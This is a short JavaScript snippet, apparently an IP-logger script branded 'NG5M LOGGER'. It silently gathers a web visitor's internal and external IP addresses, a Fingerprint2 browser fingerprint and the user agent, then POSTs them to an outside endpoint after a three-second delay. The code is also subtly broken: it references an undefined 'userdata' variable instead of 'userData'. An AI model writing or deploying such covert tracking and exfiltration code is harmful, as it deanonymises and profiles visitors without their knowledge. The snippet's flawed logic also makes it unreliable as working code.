var userData = {
    "internalIPs": [],
    "externalIPs": {"ipv4": [], "ipv6": []},
    "fingerprintHash": '',
    "userAgent": navigator.userAgent
}

getIPs(function(ip){
    //local IPs
    if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/))
        userData.internalIPs.push(ip);
    //IPv6 addresses
    else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/))
        userData.externalIPs["ipv6"].push(ip);
    //assume the rest are public IPs
    else
        userData.externalIPs["ipv4"].push(ip);
});

new Fingerprint2().get(function(fingerprint, components){
  // this will use all available fingerprinting sources
  userData.fingerprintHash = fingerprint

  // components is an array of all fingerprinting components used
});

var sendInfo = function(endpoint){
    setTimeout(function(){
      fetch(endpoint,{"method":"POST","headers":{"content-type":"application/json"},"body":JSON.stringify({"content":"[NG5M LOGGER] A new IP has been logged: "+userdata})})
    }, 3000)
}
